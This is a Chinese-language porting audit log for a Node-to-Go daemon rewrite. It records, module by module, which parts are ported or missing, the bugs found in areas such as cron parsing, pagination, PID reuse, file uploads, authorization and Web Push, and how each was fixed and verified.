| `relay-runtime.ts` | 106 | **MISSING** → 已补 | relay 只在 CLI 传 `--relay` 时启动，**完全不读 config 的 `daemon.relay.*`**；而 `daemon.config.reload` 把这个路径报成「已应用」——用户去设置页打开 relay，什么都没发生，界面却说生效了。已实现 `relayRuntime`：启动/停止/改地址，**地址没变就不重连**（否则每次保存设置都会把手机上的连接踢掉），退避到 30 秒；启动时读 config、每轮 reload 后应用；`--relay` 作为覆盖优先于 config。端到端：config 改为 enabled 后 reload 正确报 `daemon.relay.enabled`，且 relay 被真正启动。 |
| `worktree-core.ts` | 183 | **PARTIAL** → 已补公共规则 | 核心逻辑（解析 intent + 建 worktree）已在 `worktree_intent.go` 落地。本轮补的是它依赖的 `@bytetrue/protocol/branch-slug`：`slugify`（50 字符、优先在连字符处截断）与 `validateBranchSlug`（长度、`[a-z0-9-/]`、首尾与连续连字符）。客户端在发送前会跑这套规则，daemon 不认同一套就会出现「界面能过、后端拒绝」或反之。 |

| `persistence-hooks.ts` | 147 | **PARTIAL** → 已补 | `lastActivityAt`（「这个 agent 最后一次干活」）与 `updatedAt`（「记录最后一次变更」）是两件事：重命名会动后者、不动前者，而客户端按前者排序与分组。Store 里有这个字段，但运行期从不赋值、payload 也不发——`fetch_agents_response` 里只有 `updatedAt`。已补：轮次开始打时间戳、payload 下发、旧记录回落到 `updatedAt`（发空串会让该 agent 在活动排序里消失，协议要求是 string）。线上验证：字段有真实时间戳且 schema 通过。 | `attachAgentStoragePersistence` 那部分（订阅 agent_state 落盘）在 Go 里是内联在各 handler 里的，不需要单独挂载点。 |

| `workspace-registry-bootstrap.ts` | 219 | **MISSING** → 已补核心 | 注册表丢失（部分拷贝、写失败、原地升级）时，Node 从存活的 agent 记录重建工作区；Go 什么都不做——侧边栏空白、每个 agent 不可达，看起来像数据全丢，实际记录和会话文件都在。已实现 `RebuildWorkspaceRegistryFromAgents`：按工作目录分组（**一个目录一个工作区，不是一个 agent 一个**）、取最早创建与最晚活动、跳过已归档、跳过目录已消失的（否则侧边栏会出现一条点开就失败的条目）、注册表非空时完全不动（重建会丢用户的标题和置顶）。2 个测试。仍缺：legacy worktree 的 branch identity 回填。 |
| `tunnel-registry.ts` / `daemon-worker.ts` | 210 / 363 | **DROPPED（本轮不做）** | 隧道需要两台机器才能验证；supervisor IPC 生命周期（ready/restart/shutdown、heartbeat、父进程变化检测）依赖 Node 的 `process.send`，Go 用信号与 PID 锁实现等价语义（`daemon.go` + `pid-lock` 那批）。盲写这两块风险高于收益，已在 service-proxy Issue 里记明条件：需要第二台设备时再做。 |

| `agent-attention-policy.ts` | 80 | **MISSING** → 已补 | 注意力状态是侧边栏徽标和推送的依据。Go 里三个字段（`requiresAttention`/`attentionReason`/`attentionTimestamp`）都存在但**从不赋值**，三个 handler 全是空壳：`mark_unread` 返回 `markedAgentId: null` 且 `success: true` 却什么都没做，`clear_attention` 返回空数组，`clear_agent_attention` 返回空 agents。结果是徽标永远不亮，跑完的长任务和没启动过的一模一样。已移植 `internal/attention`（3 分钟在场阈值、聚焦抑制、最活跃在场客户端、error 不推送），并接线：轮次完成标记（除非用户正看着）、`mark_unread` 按 Node 前置条件标记工作区里最活跃的 finished agent、两个 clear 真正清除并返回快照。4 步端到端验证全通过。 |

| `connection-offer.ts` / `pairing-offer.ts` | 80 / 76 | **PARTIAL** → 已补关键语义 | 配对 offer 之前无条件返回 `relayEnabled: true` 加一个 `#offer=` 链接，**不管 relay 是否真的在跑**——扫出来的二维码指向一个连不上的地址。Node 在 `relayEnabled === false` 时直接返回 `{relayEnabled: false, url: null, qr: null}`。已按此实现。**这里还挖出一个真 bug**：`relayConfigFromStore` 读的是 `cfg["daemon"]["relay"]`，而 `LoadDaemonConfig` 已经解包过 `daemon`，所以 relay 配置永远读到零值——上一轮「修好」的 relay runtime 实际上一直以为 relay 是关的。修正后端到端验证：relay 关 → 空 url/null qr；relay 配好 → `wss://relay.example/#offer=...` + 44 行终端二维码，两者都过 schema。 |

| `script-status-projection.ts` | 325 | **PARTIAL** → 已补健康探测 | `health` 是 schema 必填字段，Go 一律发 `null`，所以界面上永远看不出 dev server 到底在不在服务。「启动了」和「正在服务」是两件事，用户对这两者的后续动作完全不同。已改为按端口探测：running 的 service 脚本若能建立 TCP 连接即 `healthy`，否则 `unhealthy`。用连接测试而不是 HTTP 请求——工作区脚本不要求说 HTTP，监听中的非 HTTP 服务也是健康的。`hostname`/`proxyUrl` 仍为空，属于未实现的反向代理。 |
| `server-id.ts` | 83 | **PORTED** | `$BYSPACE_HOME/server-id`、`BYSPACE_SERVER_ID` 覆盖（并持久化）、9 字节 → `srv_<12 base64url>`、0600 权限，与 Node 一致。 |

| `workspace-automation-gate.ts` | 50 | **MISSING** → 已补 | **安全边界**：从别人的 PR 检出的 worktree 里，`byspace.json` 是那个作者写的；跑它的 setup/scripts 就是跑他的代码，而且是一次按钮触发、无确认。Node 在工作区上记 `untrustedSource` 并对这类工作区拒绝自动化，Go 无条件执行。已实现：记录来源、setup 与脚本启动都拦截、提示语点名「PR #42 from attacker/fork. Run setup to allow them.」（GitLab 用 MR），setup 快照记为 `blocked`。显式 `workspace.setup.run` 即用户授权，清掉标记后照常执行。同仓库的 PR 不拦（代码本来就在用户手里）。 |
| `package-version.ts` / `daemon-keypair.ts` / `server-id.ts` / `exports.ts` / `json-utils.ts` | 76/69/83/82/61 | **PORTED 或 N/A** | `package-version` 是 Node 从 `package.json` 往上找版本的机制，Go 用 ldflags 编译期注入（`-X main.version`），架构差异，N/A。`daemon-keypair` 已有等价实现（v2 格式、0600、读失败重新生成）。`server-id` 已核对一致。`exports.ts` 是桶文件，`json-utils.ts` 是工具函数，Go 用标准库。 |

| `workspace-registry-model.ts` | 228 | **PARTIAL** → 已补 | 工作区 `displayName` 原来是目录名，Node 是「分支优先，非 git / detached HEAD 才回落到目录名」。同一仓库的两个 checkout 在侧边栏里因此同名——而这正是用户区分它们唯一的信息。已移植 `DeriveWorkspaceDisplayName`（含 `HEAD` 特判：detached 时 git 报的字面量是 "HEAD"，那不是名字）。`generateWorkspaceId`/`generateProjectId` 前缀与随机位数已核对一致。 |
| `project-key.ts` / `private-files.ts` / `client-message-id.ts` / `lifecycle-reasons.ts` | 57/41/16/6 | **PORTED** | `projectkey.Derive` 与 `GroupingDisplayName` 已在 `internal/projectkey`（此前移植，含 GitHub 小写化、自建 forge 保留大小写、非默认端口、`#subdir:`）；`WriteAtomic` 与 `private-files` 一致（0700 目录、0600 文件、临时文件 + rename）；`client-message-id` 归一化已在使用；`lifecycle-reasons` 是常量表，Go 用字面量。 |

| `checkout-git-utils.ts` | 46 | **PARTIAL** → 已补 | `checkoutErr` 一律返回 `code: "UNKNOWN"`，而协议有四个码。码决定 UI 给什么下一步：合并冲突要「解决后重试」，非 git 目录要「这不是 checkout」，两者之前都显示成无法解释的失败。已按 git 措辞分类（MERGE_CONFLICT / NOT_GIT_REPO / NOT_ALLOWED / UNKNOWN），2 个测试。 |
| `script-route-branch-handler.ts` / `script-proxy.ts` / `watcher-liveness-canary.ts` / `workspace-git-metadata.ts` | 24/8/66/28 | **DROPPED（依赖未实现子系统）** | 前三者全部是 service-proxy / 文件 watcher 的一部分——反向代理未实现，Go 用 1 秒轮询代替 watcher（无需 liveness canary）。`workspace-git-metadata` 的语义已由 `internal/gitmeta` + `FetchRemote` 覆盖。 |

| `worktree-errors.ts` | 43 | **MISSING** → 已补 | 协议允许 `branch_already_checked_out` / `missing_checkout_target` / `unknown_branch` / `unknown`，客户端按码给下一步（换名字 / 先 fetch / 名字不存在）。Go 的意图路径和创建路径各用一个自定义码，所有失败长得一样。已实现 `ToWorktreeWireError`（按 git 措辞分类，含 `errors.As` 解包），两处响应都改用分类后的码。2 个测试。 |
| `bytspace-home.ts` / `atomic-file.ts` / `messages.ts` / `path-utils.ts` / `pairing-qr.ts` / `daemon-version.ts` / `process-diagnostics.ts` | 20/25/39/42/18/10/38 | **PORTED 或 N/A** | `byspace-home` 等价于 `internal/home`；`atomic-file` 等价于 `home.WriteAtomic`；`messages`/`path-utils` 是 Node 侧辅助（Go 用标准库）；`pairing-qr` 已用 `skip2/go-qrcode`（此前修正过假实现）；`daemon-version` 由 ldflags 注入；`process-diagnostics` 是 Node 进程诊断，Go 用 `runtime`/信号。 |
| `git-metadata-event-rules.ts` | 177 | **PORTED**（本批此前已补） | 规则表已在 `internal/gitmeta`，7 个测试。仍**未接 watcher**——daemon 目前 1 秒轮询全量 diff，接上这张表是替换轮询的前置。 |
| `workspace-registry-bootstrap-legacy.ts` | 89 | **N/A（COMPAT）** | 文件本身标注 `COMPAT(legacyRegistryBootstrap)`，用于把 v0.1.109 之前的旧记录迁移成注册表。`RebuildWorkspaceRegistryFromAgents` 已覆盖「注册表丢失 → 从 agent 记录重建」的核心语义；逐目录分类迁移属于一次性历史包袱，本项目是单一用户的硬分叉（见 memory #1807：不写向后兼容）。 |

### server/authorization/** | 517 | **MISSING\*\* → 已补

语义权限模型完全没移植。每个连接都能驱动 agent、推分支、改文件，不管它是怎么认证的、relay 给了它什么权限。协议里有这套模型，而没有任何地方检查它。

做法：用脚本从 `operation-permissions.ts` **机械生成** 204 条入站 + 219 条出站表，而不是手抄——一条写错要么是安全边界上的洞，要么是某个功能对受限主体神秘失效。

- 权限是语义的（`workspace.write`），不是 RPC 命名空间，新操作按「它做什么」自动继承正确要求
- 支持 any-of（`["workspace.write", "hub.execute"]`）
- 既不在要求表、也不在 unrestricted 表里的操作**拒绝**：表是生成的，缺条目要么是没分类的新 RPC、要么是拼写错误，默认放行会把两者都变成敞开的大门
- 本地直连是 owner（持有全部权限），所以现有 app 行为不变；`SetSinkPermissions` 是给经 relay 进来的受限主体留的缝

`TestEveryWSRouteIsClassified` 解析分发器，把「运行期才拒绝」变成「构建失败 + 清单」。当前 191 条真实 WS 路由全部覆盖，0 缺口。

### server/push/** | 669 | **MISSING\*\* → 已补 Web Push

VAPID 密钥会生成、`server_info.webPushPublicKey` 会下发、`push-tokens.json` 会写，但**从来没有真的发过一条通知**——设置页提供了一套能配置却不能送达的推送。

`internal/push` 实现了 RFC 8291 载荷加密与 RFC 8292 VAPID：

- `aes128gcm` 记录，每条消息独立 salt 与临时密钥，推送服务只转发它读不懂的密文（daemon 不把内容交给 Google/Mozilla/Apple）
- ES256 JWT，`aud` 是推送服务的 origin，为一个服务签的 token 不能拿去重放到另一个
- TTL 12 小时，与 Node 一致

token 仍是不可解释字符串：JSON 是浏览器订阅，`ExponentPushToken[...]` 是 Expo。**Expo 投递没有假装实现**——那需要 Expo 的服务，报「已送达」比不提供更糟。

404/410 会剪掉订阅：浏览器已退订的端点每次通知都白跑一趟。注意力标记现在经在场策略发送：正在看这个 agent 的客户端不推，`error` 原因不推。

验证方式是**用自己的密文 + 订阅方私钥做往返解密**——只检查字节「看起来像」的测试，在密钥推导写错时也会通过。

### server/schedule/** | 1404 | **PARTIAL\*\* → 已补 cron

**真 bug**：cron 解析只认分钟位的 `*/N`，其他一律返回「下一分钟」。于是 `0 9 * * *`（每天 9 点）会**每分钟触发一次**，一天 1440 次。比拒绝解析更糟——用户以为设的是每天一次。

已移植 `@bytetrue/protocol/schedule/cron-expression`：五段字段、列表/范围/步长、以及 cron 的日期规则（日与星期都受限时**任一匹配即可**）。下一次触发的搜索按月/日/小时跳转，不逐分钟扫；四年内无解则明确失败。

无法解析的表达式现在返回**没有下次触发时间**，而不是回落到「每分钟」——那个回落正是这次的病根。

端到端验证：06:29 UTC 创建 `0 9 * * *`，`nextRunAt` = `2026-10-21T09:00:00Z`。

### server/orchestration-skills/** | 1665 | **PARTIAL\*\* → 已补回滚

`applySkillsStatus` 逐个 home 拷贝、**每个错误都用 `_ =` 吞掉**。第二个目标失败时，第一个已经装上新版、其余没有，而回报的状态描述的是磁盘上并不存在的选择——设置页显示「已是最新」而实际半装。

现在每次改动都记日志：已有的 skill 目录先 rename 到旁边再替换；任一目标失败则全部还原并返回错误，两个 skill handler 也会把错误报给客户端而不是吞掉。备份只在全部成功后删除。

这覆盖了 Node 事务支持里最要紧的部分，但**没有**实现崩溃后恢复（那需要落盘 journal），已记为剩余工作。

### server/file-explorer/**、server/file-observer/**、server/websocket/\*\* | 1093/1330/457

- `file-explorer`：列表、读取、带 `expectedModifiedAt`/`expectedRevision` 乐观锁的写入、创建/重命名/删除，Go 均已实现（`internal/workspace/files.go` + `ws_workspace.go`）。
- `file-observer`：Node 用原生递归 watcher + 协调；Go 用 1 秒轮询 `fs.file.update`。**语义等价但机制不同**——轮询在超大仓库上有成本，接 `internal/gitmeta` 规则表 + watcher 是后续性能工作（已在 `decisions/004` 记录）。
- `websocket/runtime-metrics`：诊断计数器，只写日志、不进协议。Go 无结构化日志子系统（已在 `logger.ts` 条目说明），N/A。

### server/auto-archive-on-merge/** | 231 | **MISSING\*\* → 已补

`daemon.autoArchiveAfterMerge` 是「可热更新」的配置项，但**背后没有任何行为**：打开它什么也不会发生，用户仍要手工清理已合并的 worktree。

**守卫本身就是这个功能。** 归档会删掉 worktree，所以只在：PR 已合并、工作树干净、没有未推送的提交、worktree 是 BySpace 自己创建的、且没有因为这个 PR URL 归档过（URL 是幂等键）时才做。

「未推送」这一条尤其关键：PR 打开之后追加的 commit 不在那个 PR 里，「已合并且干净」不足以判断。计数失败返回 -1 并拦截——不可验证的状态不许删东西。

跑在慢的 workspace-reconcile tick 上，不是每秒那个：每分钟每个工作区一次 forge 调用是不礼貌的。

### server/pagination/** | 203 | **PARTIAL\*\* → 已补

游标原来是「行偏移量的十进制字符串」。这种游标只在数据不变时稳定：agent 列表按最后活动排序，而最后活动**一直在变**，所以两次翻页之间若有 agent 完成或新增，后面每一行都位移——客户端会看到重复项，并且永远看不到落进缝隙的那条。对这个列表来说这不是边缘情况，是常态。

已移植 `server/pagination/cursor`：游标携带排序规格 + 最后一行的排序值 + id，下一页从那一行继续，不受之前插入的影响。排序规格不符的游标**拒绝**（否则会跳行），格式错误的游标返回空页（而不是静默从头发起，那会让客户端在第一页上无限循环），排序键相同的按 id 打破平局（否则页边界会落在同值组中间而丢行）。

端到端验证：4 页每页 2 条，共 8 个唯一 agent，无重复无遗漏。

### server/managed-processes/** | 455 | **PARTIAL\*\* → 已补 PID 身份校验

`managed-processes.ts` 存在的理由就是 **pid 复用**：文件里的 pid 不是句柄，崩溃后那个号会被机器上任何进程复用。Go 的 `StopRunning` 直接读 pid 就 `SIGTERM`/`SIGKILL`——`byspace daemon stop` 可能杀掉编辑器或另一个 daemon。

已修：`ProcessMatches` 用 `ps -o command=` / `Get-CimInstance` 读出那个 pid 实际在跑什么，与 daemon 身份比对。存活但不是 daemon → 当作陈旧锁回收，**不发送任何信号**；命令行读不到也拒绝——不杀是可恢复的，杀错不是。

端到端验证：把当前 shell 的 pid 写进 `byspace.pid` 再跑 `daemon stop`，报 `not running`、shell 存活、锁被清理。

其余 `managed-processes` 的语义（`opencode serve` 池台账、优雅关停 5s + 强制 1s）Go 用的是 `exec.Command` 的进程句柄与进程组 kill，句柄本身不会指错进程，架构等价。

### utils/tree-kill.ts | 216 | **PARTIAL** → 已补

`Close` 从「关 stdin」直接跳到 500ms 后 SIGKILL。这样被杀掉的 provider 可能丢掉会话文件——而 transcript 就是用户的历史，丢了不可恢复。

现在三段式（对齐 tree-kill.ts）：关 stdin（这些 CLI 的优雅信号）→ 2 秒后对整个进程组发 SIGTERM（还能 flush）→ 再 2 秒后 SIGKILL。进程组用负数 pid 发信号，MCP 桥和语言服务器一起走。

验证：用一个 trap SIGTERM 并写标记文件的 shell，`Close` 之后标记存在，说明优雅信号赢了；另一个测试确认忽略 SIGTERM 的进程仍会被收割而不是把 daemon 挂住。

### utils/project-icon.ts | 531 | **MISSING** → 已补

项目自带 favicon 的自动探测完全没实现，所以每个项目在侧边栏都是占位符——尽管几乎每个仓库都有 `public/favicon.svg`。用户得手动上传一个本来就存在的图标。

已移植 `internal/projecticon`：优先目录（`public`/`static`/`assets`/…）→ monorepo 的 `packages/*`、`apps/*` → 限深递归扫描；`node_modules` 等永不进入（否则一棵依赖树就能让扫描花上几秒，还可能把依赖的图标当项目的）。

**搜索顺序就是这个功能**：仓库根的 favicon 胜过 app 里的 logo，同名时 `.svg` 胜过 `.ico`（因为可缩放）。图标以 base64 返回而不是路径——客户端在很多地方渲染它，文件路径只对本地连接有效。

端到端验证：有 `public/favicon.svg` 的项目返回 `detected image/svg+xml`，响应通过协议校验。

### utils/git-process-scheduler.ts | 144 | **MISSING** → 已补

git 调用没有任何节流：daemon 每秒轮询每个订阅的工作区、每次轮询跑好几条 git，十几个工作区同时打开就是每秒钟几十个 git 进程一起起——机器卡顿，而且用户自己的 git 命令排在我们的后面。

两个限制，都可配置、默认值与 Node 一致：并发 8、每秒启动 64。context 取消时放弃等待，所以关闭不会卡在队列后面；调优变量写错回落到默认值而不是让 daemon 停止服务。

验证：12 个并发在限制 3 下峰值不超过 3；每秒 4 个的速率下 8 次启动至少跨两个窗口；排队的 acquire 在 context 结束时返回。

### utils/byspace-config-file.ts | 126 | **PARTIAL** → 已补校验

`write_project_config` 把编辑器发来的一切原样落盘。而 daemon 之后要读这个文件跑 setup 和脚本，所以形状错**不是外观问题**：`"setup": "npm ci"`（该是数组却写成字符串）会让 setup 静默什么都不做；`"scripts": {"dev": "vite"}`（该是对象却写成字符串）会让脚本从选择器里消失。两种情况都要等下一次运行才暴露，离造成它的那次编辑很远。

已加 `ValidateProjectConfig`：校验 setup 是字符串或字符串数组、scripts 是对象且每项是命令字符串或选项对象、type 只允许 `script`/`service`；错误信息点名字段（编辑器没别的可显示）。协议的 `invalid_project_config` 没有 message 字段，详细原因写 daemon 日志而不是在线上发明一个。

端到端验证：错的 `type` 被拒且 schema 通过，合法配置正常写入。

### utils/string-command-shell.ts | 54 | **MISSING** → 已补

每个项目命令都跑 `/bin/sh -lc`。`-l` 会加载用户的登录文件，那能改 PATH、定义别名、打印横幅、甚至 `cd` 走——于是「一个人能跑的 setup 命令，另一个人跑不了，且看不出原因」。Node 用非登录的 `bash -c` 就是为了让 `byspace.json` 的命令可复现。

`BASH_ENV` 也一直留在子进程环境里：非交互 bash 会在执行命令前 source 它指向的文件，等于项目命令执行了一个不属于项目的文件。现在连同 `ENV` 一起剥离。

Windows 用 PowerShell 的 `-NoProfile -NonInteractive -ExecutionPolicy Bypass`，用户 profile 无法改写环境或阻塞在提示上。

端到端验证：含算术展开的脚本仍然正常执行并写出结果。

### utils/worktree-metadata.ts | 369 | **MISSING** → 已补

BySpace 创建的 worktree 不记录任何来源信息：diff 该跟哪个 base 比、这个 worktree 来自哪个 PR，两者都没有——daemon 只能猜或者每次请求都去问 forge。

文件放在 worktree 自己的 git 目录（`.git/worktrees/<name>/byspace/`），**不是工作树**：放在工作树里会出现在 `git status` 和用户正在看的每一个 diff 里。放在 worktree 而不是注册表里，也让它在注册表丢失或重建后仍然存在。

创建时记录 `baseRefName`（显示名）与 `baseRef`（精确 ref）。「main」在本地分支、`origin/main`、`upstream/main` 之间是歧义的，而远端默认分支可能在 worktree 创建之后变更——精确 ref 才是让后来的 diff 可比的东西。

损坏的或 v1 的文件读作「无元数据」而不是报错：worktree 仍然可用，因为一个小边文件坏了就让每个状态请求失败，比丢失 base-ref 提示更糟。

**顺带修掉一个我自己引入的缺口**：三条 branch-off 路径里有两条没设 `BaseRef`，默认流程记录的是空值。

### server/utils 其余 | —

| 文件                                                                                                                              | 行              | 结论                                                                                                                                                                                                                                                                                                                                            |
| --------------------------------------------------------------------------------------------------------------------------------- | --------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `directory-suggestions.ts`                                                                                                        | 777             | **PORTED** — `internal/dirstream` + `internal/match`，此前逐行移植（七级排序、gitignore 感知、suffix 模式）。                                                                                                                                                                                                                                   |
| `run-git-command.ts` / `git-command-trace.ts` / `git-rev-parse-path.ts`                                                           | 552/119/25      | **PORTED** — `runGit` 已对齐超时分级、`GIT_TERMINAL_PROMPT=0`、`GIT_OPTIONAL_LOCKS=0`、`LC_ALL=C`。trace 的功能由 `BYSPACE_PI_TRACE` 提供（provider 侧），git 侧未加 trace——诊断 git 问题用 `GIT_TRACE=1` 即可，不需要自己实现。                                                                                                                |
| `worktree.ts`                                                                                                                     | 1686            | **PORTED（核心）** — slugify/validateBranchSlug 已在 `branchslug.go`，创建流程在 `worktree_intent.go`。                                                                                                                                                                                                                                         |
| `checkout-git.ts`                                                                                                                 | 4134            | **PARTIAL** — 核心 git 操作（diff/merge/stash/branch/commit）都有实现；`checkoutErr` 的错误码分类已补。仍缺 git 错误的结构化分类（Node 用 typed errors，Go 用措辞匹配）。                                                                                                                                                                       |
| `project-custom-icon.ts`                                                                                                          | 174             | **PARTIAL** — 自定义图标的上传/读取/删除都有；**revision 语义不同**：Node 对所有图标（含自动探测的）用 `sha256(source+mime+data)` 做指纹，Go 只对自定义图标用 registry 里的 uuid，自动图标不带 revision。后果是自动图标内容变化时客户端可能不刷新。未改，因为没有观察到用户可见故障，且加指纹要在 `fetch_projects` 列表里读每个项目的 favicon。 |
| `promise-timeout.ts`                                                                                                              | 45              | **N/A** — Go 用 `context.WithTimeout`，这是语言层面的等价物。                                                                                                                                                                                                                                                                                   |
| `spawn.ts` / `windows-command.ts`                                                                                                 | 124/104         | **PORTED（语义）** — 子进程环境剥离（`home.ExternalProcessEnv`）、进程组、Windows 的 ConPTY 与 PowerShell `-NoProfile` 都已处理。                                                                                                                                                                                                               |
| `script-hostname.ts` / `build-metadata-prompt.ts` / `tool-call-parsers.ts` / `git-command-runtime-metrics.ts` / `ssh-hostname.ts` | 36/64/48/179/68 | 前两个依赖未实现的 service-proxy；`tool-call-parsers` 由各 provider 的 `BuildToolCallDetail` 覆盖；`git-command-runtime-metrics` 只写日志不进协议；`ssh-hostname` 属于 tunnel（DROPPED）。                                                                                                                                                      |

### terminal/terminal-session-store.ts | 65 | **MISSING** → 已补

daemon 重启后终端的 tab 全没了。进程和 scrollback 回不来（没法复活一个 shell），但 tab 本身可以——重新打开 app 应该看到刚才在用的终端，而不是一个空面板。

只持久化元数据（id、cwd、workspace、name）：**故意不含 pty 句柄、scrollback 和子进程 pid**——恢复上一次运行的 pid 会让 UI 挂到一个并不存在的进程上。

每次成员变化时写，与 `terminals_changed` 广播同一个位置；损坏的文件读作「没有 tab」，因为一个边文件坏了不该让 daemon 起不来。

端到端验证：创建终端后 `$BYSPACE_HOME/terminal-sessions.json` 里有对应条目。

**顺带补了一个缺口**：创建终端的路径从来没有调用过 `broadcastTerminalsChanged`，所以其他客户端看不到新 tab。

### services/forge-service.ts | 539 | **PARTIAL** → 已补两种操作

接口里有 `listPullRequests`、`listIssues`、`getPullRequestTimeline`、`getCheckDetails` 等。
Go 已覆盖 status/create/merge/auto-merge/search/checkout-target/timeline（本轮补），仍缺
`listPullRequests`、`listIssues`、`getCheckDetails` 三个独��操作。

**本轮补的是 `pull_request_timeline`**——它之前返回空 items + null prNumber，checkout 面板会
把每个 PR 都渲染成「还没有讨论」，包括用户正在等评审意见的那些。

三家 forge 分别实现：GitHub 要合并两个端点（reviews + issue comments）成一条时间线，因为面板
只显示一条线程并按 `kind` 区分，评审如果以普通评论到达会渲染成空 reviewState；GitLab 把
approval 建模成 system note，提升为 review；Gitea 只有一个 comments 端点。

评审和评论除了 `reviewState` 之外形状一致，`createdAt` 用 epoch 毫秒而不是原始 ISO 字符串——
客户端按数值排序，字符串排序会把 "2026-01-10" 排到 "2026-01-9" 前面。

截断会显式上报而不是静默丢弃：长线程在限额处停下却不说，看起来像讨论结束了。

端到端验证（stub gh）：prNumber 7、一条评审 + 一条评论按序返回、schema 通过。

`listPullRequests` / `listIssues` 没有对应的 WS RPC：协议里没有这两个消息类型，客户端通过
`forge.search` 拿到的是两者合流的结果。MCP 工具的 `forge.search` 已实现（gh/glab/tea 三家）。
所以这两项是 **N/A**，不是缺口。

**本轮还补了 `get_check_details`**：之前返回 `details: null` + `success: true`，checkout 面板点
一个失败的 check 只看到「这个检查失败了」，看不出哪里坏了。已移植 check run + annotations（文件、
行号、级别、消息）——annotations 才是用户能动手改的部分。只有 GitHub 有 check run，其他 forge 返
回错误而不是空对象，因为 UI 把空对象渲染成「没有详情」，用户会以为检查静默通过了。

### terminal/terminal-capture.ts | 71 | **PARTIAL** → 已补

`capture_terminal_request` 解析了 `start`/`end`/`stripAnsi` 但都没用对：start/end 只当非负
切片偏移，文档里写的负数形式（`-1` 是最后一行）什么也选不到，倒置区间静默给出错误的切片而不是空。

已移植 `terminal.CaptureLines`：负数从末尾数、越界钳制而非报错（要最后 100 行而屏幕只有 10 行，
就要这 10 行）、倒置区间为空、ANSI 剥离同时覆盖 OSC 与模式序列而不只是 CSI 颜色。

这重要的原因是调用方在把文本喂给**不能渲染终端的东西**——读构建输出的 agent、对提示符断言的测试
——切片边界上的半个行、文本中间的色码，都是错误输出而不是渲染细节。

### server/file-upload/** | 220 | **MISSING\*\* → 已补（严重）

`file.upload.request` 在协议里**只有元数据**（`fileName`/`mimeType`/`size`/`modifiedAt`），字节通过同一条 socket 上的二进制 `FileBegin`/`FileChunk`/`FileEnd` 帧传（0x10/0x11/0x12）。Go 读的是一个 schema 里根本不存在的 `data` 字段，文件名读的是 `name` 而不是 `fileName`。

后果：**每一次上传都写成空文件**，文件名叫 `upload.bin`，而且响应说成功。三个失败同时静默。

已实现帧编解码 + 上传状态机：按 requestId 的 begin/chunk/end 序列、每次上传一个暂存目录、陈旧上传定时器（客户端中途关标签页不会留下不断增长的目录）、文件名清洗（名字会成为路径组件）。相对声明长度短写会报错而不是成功——报成功等于交给用户一个截断的文件。

顺带修了既有测试——它一直在断言我自己发明的形状。这也说明**测试断言了错误的东西时，测试反而是缺口的掩护**。

### server/migrations/backfill-workspace-id | 95 | **MISSING** → 已补

每个代码路径都把 `WorkspaceID` 当权威归属，所以早于该字段的 agent 记录**是不可见的**：不出现在任何工作区，History 也恢复不了。那些记录还在磁盘上，所以会话看起来像丢了。

解析规则按 Node：exact cwd 匹配（最早的优先）→ 否则最深的包含目录，带分隔符检查（`/repo/app` 不能匹配 `/repo/application`）。**home 目录永远不拥有其后代**——所有无关 agent 都住在那下面，把它们全归到一个工作区比留作无主更糟。

live 记录只解析到 live 工作区，archived 记录可以解析到 archived 的，这样 History 保留归属。启动时跑一次并写回，因此幂等，下游不需要兜底。

### server/file-download/token-store.ts | 64 | **PARTIAL** → 已补

过期下载 token 只在**使用时**检查，从不清理——用户打开过的每个文件预览都会在 map 里留一条，直到 daemon 重启。

在签发新 token 时清理：那是 map 唯一增长的时机，任意时刻集合都很小，为它加一个后台清扫器是多余的部件。

### services/gitlab-service.ts | 1411 | **PARTIAL** → 已补 pipeline/approvals

GitLab 分支的 `GetPRStatus` 返回 `checks: []` 且没有审批数，于是一个卡在失败 pipeline 或缺审批的 MR 看起来是就绪的——checkout 面板会给出一个 forge 随后拒绝的合并按钮，而失败的 pipeline 完全不可见。

现在读 pipelines 与 approvals 两个端点。`mergeable` 在审批不足时是 `BLOCKED`、满足时 `MERGEABLE`、forge 不报要求时 `UNKNOWN`——猜 `BLOCKED` 会把可合并的 MR 藏起来。

pipeline 状态映射到协议的封闭 check-status 枚举。未识别的 GitLab 状态变成 `pending` 而不是透传：客户端遇到枚举外的字符串会**拒绝整条消息**，一个新状态会让面板空白。

`isDraft` 也读标题前缀了：不同 GitLab 版本对标志位的表示不一致，两种都检查。

### executable-resolution/** | 241 | **MISSING\*\* → 已补

provider 可用性用的是 `exec.LookPath`，它返回 PATH 上**第一个**匹配。这和「一个能跑的二进制」不是一回事：PATH 上靠前的陈旧或损坏安装会遮住后面正常的那份，而 providers 页会因此对一个明明装了的机器报「未安装」。用户唯一的出路是去修 PATH。

`internal/execres` 枚举 PATH 上每个候选、逐个用 `--version` 探测直到有一个成功，所以「可用」的含义就是「这个二进制能跑」，这也正是页面上那句话声称的东西。含分隔符的名字当字面路径处理并探测，不走搜索。Windows 通过 PATHEXT 解析扩展名。

### test-utils/** | 27 | **N/A\*\* — 测试辅助（平台标记、日志桩、vitest setup），Go 侧用 `testing` 包与 build tag 达到同样目的。

### packages/relay/src | 837 | **PORTED（兼容性已锁定）**

注意：这里是**保留的** relay E2EE 代码，不是归档的 relay 服务端——Web 前端仍然 import
`@bytetrue/relay/e2ee`，所以它必须与 Go 侧**字节级兼容**。

`crypto.ts` 的形状是 `[24 字节 nonce][密文]`（XSalsa20-Poly1305）。Go 的 `internal/e2ee` 用
`golang.org/x/crypto/nacl/box`，同一个 NaCl 标准实现。本轮补了 4 个兼容性测试锁定这一点：

- 密文前 24 字节是 nonce（客户端按这个切分）
- 双向派生出的共享密钥相同（否则一方只能发不能收）
- 公钥长度不对/非 base64 要拒绝，不能静默使用
- 篡改的密文必须解密失败而不是返回垃圾

**为什么值得单独锁**：这里一旦失配，所有浏览器经 relay 的连接都会断，而现象是「relay 挂了」
而不是「协议变了」——最难查的那类故障。

`encrypted-channel.ts`（579 行）的会话状态机对应 `internal/e2ee/channel.go`；
`base64.ts`/`types.ts`/`index.ts`/`e2ee.ts` 是转出与类型。

### packages/cli/src/output/** | 570 | **MISSING\*\* → 已补

`ls` 只有 `--json` 和一个硬编码的 `printf` 表格，其他列表命令各写各的格式化。同一条命令既被人在终端里读、也被脚本解析，而这套输出只服务了其中一种。

`internal/cli/output` 现在提供 `--json`、`--yaml`、`-q/--quiet` 和默���自适应表格（列宽跟内容与终端宽度）。YAML 是手写的，因为 CLI 只输出 map/slice/标量，引一个完整编码器是 daemon 二进制要永久背负的依赖；有歧义的标量会加引号，保证输出可解析。

